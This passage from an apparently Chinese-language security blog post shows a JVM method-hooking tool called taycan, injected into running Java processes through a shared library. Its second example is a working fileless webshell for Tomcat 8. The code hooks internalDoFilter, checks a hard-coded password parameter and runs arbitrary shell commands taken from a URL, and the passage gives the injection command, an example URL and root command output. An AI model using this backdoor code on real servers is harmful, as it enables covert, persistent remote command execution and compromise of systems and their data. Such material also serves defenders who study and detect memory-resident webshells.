        <span class="n">TestJni</span> <span class="n">a</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TestJni</span><span class="o">();</span>
        <span class="k">while</span><span class="o">(</span><span class="kc">true</span><span class="o">){</span>
            <span class="n">a</span><span class="o">.</span><span class="na">circle</span><span class="o">();</span>
            <span class="n">Thread</span><span class="o">.</span><span class="na">sleep</span><span class="o">(</span><span class="mi">2000</span><span class="o">);</span>
        <span class="o">}</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p>写如下代码，将TestJni.circle hook掉，在hook函数中调用System.out.println(""you are hacked"")</p>
<div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">"include/java_native_base.h"</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">"include/jvm_method.h"</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">"jni.h"</span><span class="cp"></span>

<span class="k">class</span> <span class="nc">example</span> <span class="o">:</span> <span class="n">JavaNativeBase</span>
<span class="p">{</span>
<span class="k">public</span><span class="o">:</span>
    <span class="n">example</span><span class="p">(</span><span class="cm">/* args */</span><span class="p">);</span>
    <span class="o">~</span><span class="n">example</span><span class="p">(){};</span>
<span class="p">};</span>

<span class="k">static</span> <span class="n">example</span> <span class="n">_e</span><span class="p">;</span>

<span class="n">JNIEXPORT</span> <span class="kt">void</span> <span class="n">JNICALL</span> <span class="nf">hook_circle</span><span class="p">(</span><span class="n">JNIEnv</span><span class="o">*</span> <span class="n">env</span><span class="p">,</span> <span class="n">jobject</span> <span class="n">thiz</span><span class="p">)</span>
<span class="p">{</span>
    <span class="c1">// Get system class</span>
    <span class="n">jclass</span> <span class="n">syscls</span> <span class="o">=</span> <span class="n">env</span><span class="o">-&gt;</span><span class="n">FindClass</span><span class="p">(</span><span class="s">"java/lang/System"</span><span class="p">);</span>
    <span class="c1">// Lookup the "out" field</span>
    <span class="n">jfieldID</span> <span class="n">fid</span> <span class="o">=</span> <span class="n">env</span><span class="o">-&gt;</span><span class="n">GetStaticFieldID</span><span class="p">(</span><span class="n">syscls</span><span class="p">,</span> <span class="s">"out"</span><span class="p">,</span> <span class="s">"Ljava/io/PrintStream;"</span><span class="p">);</span>
    <span class="n">jobject</span> <span class="n">out</span> <span class="o">=</span> <span class="n">env</span><span class="o">-&gt;</span><span class="n">GetStaticObjectField</span><span class="p">(</span><span class="n">syscls</span><span class="p">,</span> <span class="n">fid</span><span class="p">);</span>
    <span class="c1">// Get PrintStream class</span>
    <span class="n">jclass</span> <span class="n">pscls</span> <span class="o">=</span> <span class="n">env</span><span class="o">-&gt;</span><span class="n">FindClass</span><span class="p">(</span><span class="s">"java/io/PrintStream"</span><span class="p">);</span>
    <span class="c1">// Lookup printLn(String)</span>
    <span class="n">jmethodID</span> <span class="n">mid</span> <span class="o">=</span> <span class="n">env</span><span class="o">-&gt;</span><span class="n">GetMethodID</span><span class="p">(</span><span class="n">pscls</span><span class="p">,</span> <span class="s">"println"</span><span class="p">,</span> <span class="s">"(Ljava/lang/String;)V"</span><span class="p">);</span>
    <span class="c1">// Invoke the method</span>
    <span class="n">jstring</span> <span class="n">str</span> <span class="o">=</span> <span class="n">env</span><span class="o">-&gt;</span><span class="n">NewStringUTF</span><span class="p">(</span> <span class="s">"you are hacked"</span><span class="p">);</span>
    <span class="n">env</span><span class="o">-&gt;</span><span class="n">CallVoidMethod</span><span class="p">(</span><span class="n">out</span><span class="p">,</span> <span class="n">mid</span><span class="p">,</span> <span class="n">str</span><span class="p">);</span>
<span class="p">}</span>

<span class="n">example</span><span class="o">::</span><span class="n">example</span><span class="p">(</span><span class="cm">/* args */</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">JNIEnv</span> <span class="o">*</span> <span class="n">env</span> <span class="o">=</span> <span class="n">getEnv</span><span class="p">();</span>
    <span class="k">if</span><span class="p">(</span><span class="n">env</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">jclass</span> <span class="n">clazz</span> <span class="o">=</span> <span class="n">env</span><span class="o">-&gt;</span><span class="n">FindClass</span><span class="p">(</span><span class="s">"TestJni"</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="n">clazz</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">){</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"FindClass error</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">jmethodID</span> <span class="n">method_circle</span> <span class="o">=</span> <span class="n">env</span><span class="o">-&gt;</span><span class="n">GetMethodID</span><span class="p">(</span><span class="n">clazz</span><span class="p">,</span> <span class="s">"circle"</span><span class="p">,</span> <span class="s">"()V"</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="n">method_circle</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">){</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"GetMethodID circle error</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">JVMMethod</span> <span class="o">*</span> <span class="n">method_stub</span> <span class="o">=</span> <span class="p">(</span><span class="n">JVMMethod</span> <span class="o">*</span><span class="p">)</span><span class="n">method_circle</span><span class="p">;</span>
    <span class="n">method_stub</span><span class="o">-&gt;</span><span class="n">print</span><span class="p">();</span>
    <span class="n">hookJvmMethod</span><span class="p">(</span><span class="n">method_stub</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">hook_circle</span><span class="p">);</span>
<span class="p">}</span>
</pre></div>
<p>编译生成so之后，使用soloader对JVM进程注入so</p>
<pre><code>Usage:
    ./soloader &lt;jvmpid&gt; &lt;sopath&gt; [is_unload]

soloader 77339 /root/taycan/example/libmy.so</code></pre>
<p>参数分别为PID、so全路径。可以提供第4个参数，如果为1，表示so在注入运行之后立即就卸载。</p>
<h3 data-content="1" id="bd53bfbcd410139cae233ee3b7a201af">示例2: 注入tomcat内存马</h3>
<p>tomcat注入内存马，采用的办法是hook函数internalDoFilter</p>
<div class="highlight"><pre><span></span><span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">core</span><span class="o">.</span><span class="na">ApplicationFilterChain</span><span class="o">.</span><span class="na">internalDoFilter</span><span class="o">(</span><span class="n">javax</span><span class="o">.</span><span class="na">servlet</span><span class="o">.</span><span class="na">ServletRequest</span><span class="o">,</span> <span class="n">javax</span><span class="o">.</span><span class="na">servlet</span><span class="o">.</span><span class="na">ServletResponse</span><span class="o">)</span> <span class="o">:</span> <span class="kt">void</span>
</pre></div>
<p>以下代码在tomcat8上测试通过</p>
<div class="highlight"><pre><span></span><span class="kt">void</span> <span class="n">example</span><span class="o">::</span><span class="n">inject_mem_shell</span><span class="p">()</span>
<span class="p">{</span>
    <span class="n">JNIEnv</span> <span class="o">*</span> <span class="n">env</span> <span class="o">=</span> <span class="n">getJNIEnv</span><span class="p">();</span>
    <span class="k">if</span><span class="p">(</span><span class="n">env</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">jvmtiEnv</span> <span class="o">*</span> <span class="n">jvmti_env</span> <span class="o">=</span> <span class="n">getJVMTIEnv</span><span class="p">();</span>
    <span class="k">if</span><span class="p">(</span><span class="n">jvmti_env</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1">//printf("JVMTI ENV %p\n", jvmti_env);</span>
    <span class="n">_applicationFilterChain_clazz</span> <span class="o">=</span> <span class="k">this</span><span class="o">-&gt;</span><span class="n">jvmti_find_class</span><span class="p">(</span><span class="s">"org.apache.catalina.core.ApplicationFilterChain"</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="n">_applicationFilterChain_clazz</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">){</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"FindClass org.apache.catalina.core.ApplicationFilterChain error</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">_servlet_clazz</span> <span class="o">=</span> <span class="k">this</span><span class="o">-&gt;</span><span class="n">jvmti_find_class</span><span class="p">(</span><span class="s">"javax.servlet.Servlet"</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="n">_servlet_clazz</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">){</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"FindClass javax.servlet.Servlet error</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">internalDoFilter_signature</span> <span class="o">=</span> <span class="s">"(Ljavax/servlet/ServletRequest;Ljavax/servlet/ServletResponse;)V"</span><span class="p">;</span>
    <span class="n">jmethodID</span> <span class="n">internalDoFilter</span> <span class="o">=</span> <span class="n">env</span><span class="o">-&gt;</span><span class="n">GetMethodID</span><span class="p">(</span><span class="n">_applicationFilterChain_clazz</span><span class="p">,</span> <span class="s">"internalDoFilter"</span><span class="p">,</span> <span class="n">internalDoFilter_signature</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="n">internalDoFilter</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">){</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"jvmti_get_method internalDoFilter error</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">JVMMethod</span> <span class="o">*</span> <span class="n">method</span> <span class="o">=</span> <span class="p">(</span><span class="n">JVMMethod</span> <span class="o">*</span><span class="p">)</span><span class="n">internalDoFilter</span><span class="p">;</span>
    <span class="c1">//method-&gt;print();</span>
    <span class="n">hookJvmMethod</span><span class="p">(</span><span class="n">method</span><span class="p">,(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">hook_internalFilter</span><span class="p">);</span>
<span class="p">}</span>
</pre></div>
<p>hook掉internalDoFilter方法，在前面加入内存马逻辑，之后正常调用this.servlet.service(req, rsp)保证页面的正常加载。<br/>
方法原型为void internalDoFilter(javax.servlet.ServletRequest, javax.servlet.ServletResponse)，对应的JNI表示参数要增加JNIEnv *和this指针</p>
<div class="highlight"><pre><span></span><span class="n">JNIEXPORT</span> <span class="kt">void</span> <span class="n">JNICALL</span> <span class="nf">hook_internalFilter</span><span class="p">(</span><span class="n">JNIEnv</span> <span class="o">*</span> <span class="n">env</span><span class="p">,</span> <span class="n">jobject</span> <span class="n">thiz</span><span class="p">,</span> <span class="n">jobject</span> <span class="n">req</span><span class="p">,</span> <span class="n">jobject</span> <span class="n">rsp</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">jobject</span> <span class="n">model</span> <span class="o">=</span> <span class="n">req_get_paramter</span><span class="p">(</span><span class="n">env</span><span class="p">,</span> <span class="n">req</span><span class="p">,</span> <span class="s">"model"</span><span class="p">);</span>
    <span class="n">jobject</span> <span class="n">pass_the_world</span> <span class="o">=</span> <span class="n">req_get_paramter</span><span class="p">(</span><span class="n">env</span><span class="p">,</span> <span class="n">req</span><span class="p">,</span> <span class="s">"pass_the_world"</span><span class="p">);</span>

    <span class="k">if</span><span class="p">(</span><span class="n">pass_the_world</span> <span class="o">!=</span> <span class="nb">NULL</span> <span class="o">&amp;&amp;</span> <span class="n">string_equals</span><span class="p">(</span><span class="n">env</span><span class="p">,</span> <span class="n">pass_the_world</span><span class="p">,</span> <span class="s">"bigbestway"</span><span class="p">))</span>
    <span class="p">{</span>
        <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">result</span><span class="p">;</span>
        <span class="k">if</span><span class="p">(</span><span class="n">model</span> <span class="o">==</span> <span class="nb">NULL</span> <span class="o">||</span> <span class="n">string_equals</span><span class="p">(</span><span class="n">env</span><span class="p">,</span> <span class="n">model</span><span class="p">,</span> <span class="s">""</span><span class="p">))</span>
        <span class="p">{</span>
            <span class="n">result</span> <span class="o">=</span> <span class="n">Memshell</span><span class="o">::</span><span class="n">help</span><span class="p">();</span>
        <span class="p">}</span>
        <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">string_equals</span><span class="p">(</span><span class="n">env</span><span class="p">,</span> <span class="n">model</span><span class="p">,</span> <span class="s">"exec"</span><span class="p">))</span>
        <span class="p">{</span>
            <span class="n">jobject</span> <span class="n">cmd</span> <span class="o">=</span> <span class="n">req_get_paramter</span><span class="p">(</span><span class="n">env</span><span class="p">,</span> <span class="n">req</span><span class="p">,</span> <span class="s">"cmd"</span><span class="p">);</span>
            <span class="k">if</span><span class="p">(</span><span class="n">cmd</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
            <span class="p">{</span>
                <span class="n">result</span> <span class="o">=</span> <span class="n">Memshell</span><span class="o">::</span><span class="n">help</span><span class="p">();</span>
            <span class="p">}</span>
            <span class="k">else</span>
            <span class="p">{</span>
                <span class="n">result</span> <span class="o">=</span> <span class="n">Memshell</span><span class="o">::</span><span class="n">exec</span><span class="p">(</span><span class="n">string_getchars</span><span class="p">(</span><span class="n">env</span><span class="p">,</span> <span class="p">(</span><span class="n">jstring</span><span class="p">)</span><span class="n">cmd</span><span class="p">).</span><span class="n">c_str</span><span class="p">());</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="n">rsp_print</span><span class="p">(</span><span class="n">env</span><span class="p">,</span> <span class="n">rsp</span><span class="p">,</span> <span class="n">result</span><span class="p">.</span><span class="n">c_str</span><span class="p">());</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1">//调用this.servlet.service(req, rsp);</span>
    <span class="n">DPRINT</span><span class="p">(</span><span class="s">"hook_internalFilter req=%p, rsp=%p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">req</span><span class="p">,</span> <span class="n">rsp</span><span class="p">);</span>
    <span class="n">jfieldID</span> <span class="n">fid</span> <span class="o">=</span> <span class="n">env</span><span class="o">-&gt;</span><span class="n">GetFieldID</span><span class="p">(</span><span class="n">_applicationFilterChain_clazz</span><span class="p">,</span> <span class="s">"servlet"</span><span class="p">,</span> <span class="s">"Ljavax/servlet/Servlet;"</span><span class="p">);</span>
    <span class="n">DPRINT</span><span class="p">(</span><span class="s">"fid=%p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">fid</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="n">fid</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="n">jobject</span> <span class="n">servlet</span> <span class="o">=</span> <span class="n">env</span><span class="o">-&gt;</span><span class="n">GetObjectField</span><span class="p">(</span><span class="n">thiz</span><span class="p">,</span> <span class="n">fid</span><span class="p">);</span>
    <span class="n">DPRINT</span><span class="p">(</span><span class="s">"servlet=%p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">servlet</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="n">servlet</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="n">jmethodID</span> <span class="n">mid</span> <span class="o">=</span> <span class="n">env</span><span class="o">-&gt;</span><span class="n">GetMethodID</span><span class="p">(</span><span class="n">_servlet_clazz</span><span class="p">,</span> <span class="s">"service"</span><span class="p">,</span> <span class="s">"(Ljavax/servlet/ServletRequest;Ljavax/servlet/ServletResponse;)V"</span><span class="p">);</span>
    <span class="n">DPRINT</span><span class="p">(</span><span class="s">"mid=%p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">mid</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="n">mid</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="n">env</span><span class="o">-&gt;</span><span class="n">CallVoidMethod</span><span class="p">(</span><span class="n">servlet</span><span class="p">,</span> <span class="n">mid</span><span class="p">,</span> <span class="n">req</span><span class="p">,</span> <span class="n">rsp</span><span class="p">);</span>
<span class="p">}</span>
</pre></div>
<p>下载apache-tomcat-8.5.69并解压到目录</p>
<pre><code>/root/apache-tomcat-8.5.69</code></pre>
<p>进入bin目录，在当前窗口启动tomcat</p>
<pre><code>./catalina.sh run</code></pre>
<p>通过浏览器访问8080端口，因为类是懒加载，需要访问一下才会加载org.apache.catalina.core.ApplicationFilterChain，否则hook时查找类会失败。通过ps命令获得JVM进程ID，执行命令注入shell</p>
<pre><code>~/taycan/taycan-sdk# ./soloader 47706 `pwd`/libmy.so</code></pre>
<p>执行成功会打印</p>
<pre><code>this=0x7fc1a463d380,_constMethod=0x7fc1a463d060,_method_data=(nil),_method_counters=0x7fc1a4647118,_adapter=0x7fc1cc07b630,_from_compiled_entry=0x7fc1bd04e5b8,_code=(nil),_access_flags=2,_vtable_index=-2,_method_size=11,_intrinsic_id=0,_jfr_towrite=0,_caller_sensitive=0,_force_inline=0,_hidden=0,_dont_inline=0,_compiled_invocation_count=0,_i2i_entry=0x7fc1bd013600,_from_interpreted_entry=0x7fc1bd013600
_constMethod:
_fingerprint=8000000000000000,_constants=0x7fc1a463c338,_stackmap_data=0x7fc1a463d3d8,_constMethod_size=100,_flags=15,_code_size=14,_name_index=388,_signature_index=118,_method_idnum=100,_max_stack=5,_max_locals=5,_size_of_parameters=10
==================================
this=0x7fc1a463d380,_constMethod=0x7fc1a463d060,_method_data=(nil),_method_counters=(nil),_adapter=0x7fc1cc07b630,_from_compiled_entry=0x7fc1bd04e5b8,_code=(nil),_access_flags=e000102,_vtable_index=-2,_method_size=11,_intrinsic_id=0,_jfr_towrite=0,_caller_sensitive=0,_force_inline=0,_hidden=0,_dont_inline=0,_compiled_invocation_count=0,_i2i_entry=0x7fc1bd018340,_from_interpreted_entry=0x7fc1bd018340
_constMethod:
_fingerprint=8000000000000000,_constants=0x7fc1a463c338,_stackmap_data=(nil),_constMethod_size=100,_flags=15,_code_size=14,_name_index=388,_signature_index=118,_method_idnum=100,_max_stack=5,_max_locals=5,_size_of_parameters=10</code></pre>
<p>使用URL访问内存马执行命令</p>
<pre><code>http://192.168.92.128:8080/?pass_the_world=bigbestway&amp;model=exec&amp;cmd=id</code></pre>
<p>页面显示命令结果</p>
<pre><code>uid=0(root) gid=0(root) groups=0(root)</code></pre>
<h2 data-content="1" id="92e608075f97434ec923eaf15339d86f">结语</h2>
<p>我在探索JVM中Java Method结构的过程中，偶然发现frida在2020年的新版本中开始支持hook openSDK（一直以为不支持），taycan借鉴了frida 14的代码。frida能够hook成功的前提是libjvm.so文件需要有调试符号即该so没有经过strip。对于这点，本项目进行了改进，无论是否有符号都能hook成功。</p>
</div>
</div>